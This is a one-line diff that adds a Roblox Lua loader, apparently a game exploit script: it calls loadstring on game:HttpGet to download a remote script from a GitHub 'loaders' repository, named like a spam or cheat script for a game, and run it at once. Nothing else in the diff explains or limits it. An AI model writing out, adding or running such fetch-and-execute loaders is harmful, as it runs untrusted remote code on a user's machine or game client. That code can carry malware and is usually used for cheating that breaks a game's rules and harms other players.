@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/clean-all-the-leaves-spam3-s9mdvm7uob8wp6.lua"))()
